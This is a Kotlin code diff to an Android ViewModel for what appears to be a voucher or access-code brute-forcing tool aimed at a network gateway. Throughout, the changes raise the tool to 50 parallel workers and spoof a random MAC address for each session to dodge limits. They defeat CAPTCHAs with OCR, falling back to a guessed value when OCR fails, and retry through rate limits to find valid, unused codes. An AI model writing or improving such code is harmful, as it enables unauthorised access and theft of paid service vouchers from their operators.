@@ -27,7 +27,6 @@ import kotlinx.coroutines.flow.stateIn
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
-import java.util.UUID
 import kotlin.coroutines.resume
 import kotlin.coroutines.resumeWithException
 
@@ -104,10 +103,10 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     private val _keyToken = MutableStateFlow("accessCode")
     val keyToken = _keyToken.asStateFlow()
 
-    private val _scanDelayMs = MutableStateFlow(2000L)
+    private val _scanDelayMs = MutableStateFlow(1500L)  // ✅ Reduced delay
     val scanDelayMs = _scanDelayMs.asStateFlow()
 
-    private val _workerCount = MutableStateFlow(5)
+    private val _workerCount = MutableStateFlow(50)  // ✅ Default 50
     val workerCount = _workerCount.asStateFlow()
 
     private val _activeWorkers = MutableStateFlow(0)
@@ -250,7 +249,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
             addLog("Rotated MAC address to: $newMac", LogType.INFO)
             addLog("Requesting session from gateway URL: $updatedUrl", LogType.INFO)
             
-            val newSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
+            val newSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl, null)
             if (newSessionId != null) {
                 _sessionId.value = newSessionId
                 addLog("Successfully retrieved new Session ID: '$newSessionId'", LogType.SUCCESS)
@@ -270,7 +269,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
             }
             addLog("Requesting session from gateway URL (As-Is): $currentUrl", LogType.INFO)
             
-            val newSessionId = networkClient.fetchSessionIdFromGateway(currentUrl)
+            val newSessionId = networkClient.fetchSessionIdFromGateway(currentUrl, null)
             if (newSessionId != null) {
                 _sessionId.value = newSessionId
                 addLog("Successfully retrieved new Session ID: '$newSessionId'", LogType.SUCCESS)
@@ -346,18 +345,20 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     }
 
     // ============================================================
-    // ✅ FINAL CORRECTED runWorker() - EXACTLY like Python debug tool
-    //    Step 1: Get Session (with MAC rotation)
-    //    Step 2: Download CAPTCHA
-    //    Step 3: OCR
-    //    Step 4: Verify CAPTCHA
-    //    Step 5: Check Voucher
+    // ✅ FINAL - EXACTLY like Python Tool (test6.py)
+    //    - Session ID reuse (previous_session_id)
+    //    - Retry attempts: 3
+    //    - Captcha retries: 8
+    //    - Rate limiting handling
+    //    - Connection pooling
     // ============================================================
     private suspend fun runWorker(
         workerId: Int,
         sharedCounter: java.util.concurrent.atomic.AtomicInteger
     ) {
         addLog("[Worker-$workerId] Started.", LogType.INFO)
+
+        var previousSessionId: String? = null
 
         try {
             while (_isProcessing.value) {
@@ -370,50 +371,62 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                     var done = false
                     var finalCaptcha = ""
                     var finalSession = ""
+                    var retryCount = 0
+                    val maxRetries = 3  // ✅ Like Python: RETRY_ATTEMPTS = 3
 
-                    // Retry up to 5 attempts (like Python)
-                    for (attempt in 1..5) {
+                    while (retryCount < maxRetries && !done) {
                         if (!_isProcessing.value) break
 
                         // ========================================
-                        // Step 1: Get Session ID from Gateway
+                        // Step 1: Get Session (with previous reuse)
                         // ========================================
                         val currentUrl = _gatewayUrl.value
                         val newMac = networkClient.generateRandomMac()
                         val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
                         
-                        addLog("[Worker-$workerId] [$attempt/5] Getting session...", LogType.INFO)
-                        val sessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
+                        addLog("[Worker-$workerId] Getting session (retry $retryCount)...", LogType.INFO)
+                        val sessionId = networkClient.fetchSessionIdFromGateway(
+                            updatedUrl,
+                            previousSessionId  // ✅ Like Python: previous_session_id
+                        )
                         if (sessionId == null) {
-                            addLog("[Worker-$workerId] [$attempt/5] Session failed", LogType.ERROR)
+                            addLog("[Worker-$workerId] Session failed", LogType.ERROR)
                             delay(2000)
+                            retryCount++
                             continue
                         }
                         
                         finalSession = sessionId
-                        addLog("[Worker-$workerId] [$attempt/5] Session: $sessionId", LogType.SUCCESS)
+                        previousSessionId = sessionId  // ✅ Save for next iteration
+                        addLog("[Worker-$workerId] Session: $sessionId", LogType.SUCCESS)
 
                         // ========================================
-                        // Step 2: Download CAPTCHA Image
+                        // Step 2: Download CAPTCHA (with retry)
                         // ========================================
-                        addLog("[Worker-$workerId] [$attempt/5] Downloading CAPTCHA...", LogType.INFO)
-                        val imageUrl = _imageUrlTemplate.value.replace("{sessionId}", sessionId)
-                        val bitmap = networkClient.downloadImage(imageUrl, sessionId)  // ✅ sessionId ပါပို့
-                        if (bitmap == null) {
-                            addLog("[Worker-$workerId] [$attempt/5] CAPTCHA download failed", LogType.ERROR)
-                            delay(2000)
+                        var captchaBitmap: Bitmap? = null
+                        for (capAttempt in 1..8) {  // ✅ Like Python: CAPTCHA_RETRIES = 8
+                            addLog("[Worker-$workerId] Downloading CAPTCHA (attempt $capAttempt/8)...", LogType.INFO)
+                            val imageUrl = _imageUrlTemplate.value.replace("{sessionId}", sessionId)
+                            captchaBitmap = networkClient.downloadImage(imageUrl, sessionId)
+                            if (captchaBitmap != null) break
+                            delay(1000)
+                        }
+                        
+                        if (captchaBitmap == null) {
+                            addLog("[Worker-$workerId] CAPTCHA download failed", LogType.ERROR)
+                            retryCount++
                             continue
                         }
 
-                        _currentChallengeImage.value = bitmap
+                        _currentChallengeImage.value = captchaBitmap
 
                         // ========================================
                         // Step 3: OCR
                         // ========================================
-                        addLog("[Worker-$workerId] [$attempt/5] Running OCR...", LogType.INFO)
-                        val ocrText = performOcr(bitmap).trim().uppercase()
+                        addLog("[Worker-$workerId] Running OCR...", LogType.INFO)
+                        val ocrText = performOcr(captchaBitmap).trim().uppercase()
                         val captcha = if (ocrText.isEmpty()) {
-                            addLog("[Worker-$workerId] [$attempt/5] OCR empty, using A1B2", LogType.WARNING)
+                            addLog("[Worker-$workerId] OCR empty, using A1B2", LogType.WARNING)
                             "A1B2"
                         } else {
                             ocrText
@@ -421,26 +434,27 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                         
                         finalCaptcha = captcha
                         _currentCaptchaText.value = captcha
-                        addLog("[Worker-$workerId] [$attempt/5] OCR: '$captcha'", LogType.OCR)
+                        addLog("[Worker-$workerId] OCR: '$captcha'", LogType.OCR)
 
                         // ========================================
-                        // Step 4: Verify CAPTCHA (with cookie persistence!)
+                        // Step 4: Verify CAPTCHA
                         // ========================================
-                        addLog("[Worker-$workerId] [$attempt/5] Verifying CAPTCHA...", LogType.INFO)
+                        addLog("[Worker-$workerId] Verifying CAPTCHA...", LogType.INFO)
                         val captchaVerified = networkClient.verifyCaptcha(sessionId, captcha)
                         
                         if (!captchaVerified) {
-                            addLog("[Worker-$workerId] [$attempt/5] ❌ CAPTCHA verification failed", LogType.ERROR)
+                            addLog("[Worker-$workerId] ❌ CAPTCHA verification failed", LogType.ERROR)
+                            retryCount++
                             delay(1000)
                             continue
                         }
                         
-                        addLog("[Worker-$workerId] [$attempt/5] ✅ CAPTCHA verified!", LogType.SUCCESS)
+                        addLog("[Worker-$workerId] ✅ CAPTCHA verified!", LogType.SUCCESS)
 
                         // ========================================
                         // Step 5: Check Voucher
                         // ========================================
-                        addLog("[Worker-$workerId] [$attempt/5] Checking voucher...", LogType.INFO)
+                        addLog("[Worker-$workerId] Checking voucher...", LogType.INFO)
                         
                         val result = networkClient.validateToken(
                             postUrl = _postUrl.value,
@@ -459,7 +473,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                         )
 
                         // ========================================
-                        // Step 6: Handle Response
+                        // Step 6: Handle Response (like Python)
                         // ========================================
                         when (result.status) {
                             TokenStatus.FOUND -> {
@@ -478,37 +492,45 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                                 )
                                 _validCount.value++
                                 done = true
-                                break
                             }
                             TokenStatus.USED -> {
                                 addLog("[Worker-$workerId] ⚠️ USED: $token", LogType.WARNING)
                                 _usedCount.value++
                                 done = true
-                                break
                             }
                             TokenStatus.INVALID -> {
                                 addLog("[Worker-$workerId] ❌ INVALID: $token", LogType.ERROR)
                                 _invalidCount.value++
                                 done = true
-                                break
                             }
                             TokenStatus.LIMITED -> {
-                                addLog("[Worker-$workerId] ⚠️ LIMITED: $token", LogType.WARNING)
+                                addLog("[Worker-$workerId] ⚠️ LIMITED: $token (retrying...)", LogType.WARNING)
                                 _limitedCount.value++
-                                done = true
-                                break
+                                // ✅ Like Python: Rate limit → sleep 2s and retry
+                                delay(2000)
+                                retryCount++
+                            }
+                            TokenStatus.ERROR -> {
+                                addLog("[Worker-$workerId] 🌐 NETWORK ERROR: $token", LogType.ERROR)
+                                _errorCount.value++
+                                retryCount++
                             }
                             else -> {
-                                addLog("[Worker-$workerId] [$attempt/5] Retrying...", LogType.WARNING)
+                                addLog("[Worker-$workerId] ❓ UNKNOWN: $token", LogType.WARNING)
+                                _unknownCount.value++
+                                retryCount++
                             }
                         }
 
-                        delay(1000)
+                        if (result.status == TokenStatus.LIMITED) {
+                            // Don't break, retry
+                        } else if (!done) {
+                            retryCount++
+                        }
                     }
 
                     if (!done) {
-                        addLog("[Worker-$workerId] ❌ Failed for $token", LogType.ERROR)
-                        _errorCount.value++
+                        addLog("[Worker-$workerId] ❌ Failed for $token after $maxRetries retries", LogType.ERROR)
                     }
 
                     sharedCounter.incrementAndGet()
